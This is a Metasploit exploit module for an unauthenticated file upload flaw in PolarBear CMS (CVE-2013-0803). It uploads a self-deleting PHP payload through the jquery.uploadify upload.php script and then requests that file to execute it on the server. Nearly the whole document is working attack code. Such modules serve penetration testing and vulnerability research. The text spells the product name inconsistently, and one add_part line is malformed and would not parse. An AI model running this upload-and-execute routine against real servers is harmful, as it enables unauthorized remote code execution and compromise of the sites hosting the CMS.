# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# Framework web site for more information on licensing and terms of use.
#   http://metasploit.com/framework/
##
 
 
require &#039;msf/core&#039;
require &#039;msf/core/exploit/php_exe&#039;
 
class Metasploit3 < Msf::Exploit::Remote
    Rank = ExcellentRanking
 
    include Msf::Exploit::Remote::HttpClient
    include Msf::Exploit::PhpEXE
 
    def initialize(info = {})
        super(update_info(info,
            &#039;Name&#039;           => &#039;PolarPearCms PHP File Upload Vulnerability&#039;,
            &#039;Description&#039;    => %q{
                    This module exploits a file upload vulnerability found in PlarPear CMS
                By abusing the upload.php file, a malicious user can upload a file to a temp
                directory without authentication, which results in arbitrary code execution.
            },
            &#039;Author&#039;         =>
                [
                    &#039;Fady Mohamed Osman&#039;  # @Fady_Osman
                ],
            &#039;License&#039;        => MSF_LICENSE,
            &#039;References&#039;     =>
                [
                    [ &#039;CVE&#039;, &#039;2013-0803&#039; ]
                ],
            &#039;Payload&#039;        =>
                {
                    &#039;BadChars&#039; => "\x00",
                },
            &#039;Platform&#039;       => &#039;php&#039;,
            &#039;Arch&#039;           => ARCH_PHP,
            &#039;Targets&#039;        =>
                [
                    [ &#039;Generic (PHP Payload)&#039;, { &#039;Arch&#039; => ARCH_PHP, &#039;Platform&#039; => &#039;php&#039; } ],
                    [ &#039;Linux x86&#039;, { &#039;Arch&#039; => ARCH_X86, &#039;Platform&#039; => &#039;linux&#039; } ]
                ],
            &#039;DefaultTarget&#039;  => 0,
            &#039;DisclosureDate&#039; => &#039;Jan 21 2012&#039;))
 
        register_options(
            [
                OptString.new(&#039;TARGETURI&#039;, [true, &#039;The full URI path to Polarbearcms&#039;, &#039;/polarbearcms&#039;]) ,
                OptString.new(&#039;UPLOADDIR&#039;, [true, &#039;The directory to upload to starting from web root. This should be writable&#039;, &#039;/polarbearcms&#039;])
            ], self.class)
    end
 
    def check
        uri =  target_uri.path
 
        res = send_request_cgi({
            &#039;method&#039; => &#039;GET&#039;,
            &#039;uri&#039;    => normalize_uri(uri, &#039;includes&#039;, &#039;jquery.uploadify&#039;, &#039;upload.php&#039;)
        })
 
        if not res or res.code != 200
            return Exploit::CheckCode::Unknown
        end
 
        return Exploit::CheckCode::Appears
    end
 
    def exploit
        uri =  target_uri.path
 
        upload_dir = normalize_uri("#{datastore[&#039;UPLOADDIR&#039;]}/")
 
        peer = "#{rhost}:#{rport}"
 
        @payload_name = "#{rand_text_alpha(5)}.php"
        php_payload = get_write_exec_payload(:unlink_self=>true)
 
        data = Rex::MIME::Message.new
        data.add_part(php_payload, "application/octet-stream", nil, "form-data; name=\"Filedata\"; filename=\"#{@payload_name}\"")
        data.add_part(normalize_uri(uri, &#039;includes&#039;, &#039;jquery.uploadify/&#039;,, nil, nil, "form-data; name=\"folder\"")
        post_data = data.to_s.gsub(/^\r\n\-\-\_Part\_/, &#039;--_Part_&#039;)
        print_status("#{peer} - Uploading payload #{@payload_name}")
        res = send_request_cgi({
            &#039;method&#039; => &#039;POST&#039;,
            &#039;uri&#039;    => normalize_uri(uri, &#039;includes&#039;, &#039;jquery.uploadify&#039;, "upload.php?folder=#{upload_dir}"),
            &#039;ctype&#039;  => "multipart/form-data; boundary=#{data.bound}",
            &#039;data&#039;   => post_data
        })
        if not res or res.code != 200
            fail_with(Exploit::Failure::UnexpectedReply, "#{peer} - Upload failed")
        end
 
        upload_uri = "#{upload_dir}#{@payload_name}"
        print_status("#{peer} - Executing payload #{@payload_name}")
        res = send_request_raw({
            &#039;uri&#039;    => upload_uri,
            &#039;method&#039; => &#039;GET&#039;
        })
    end
end

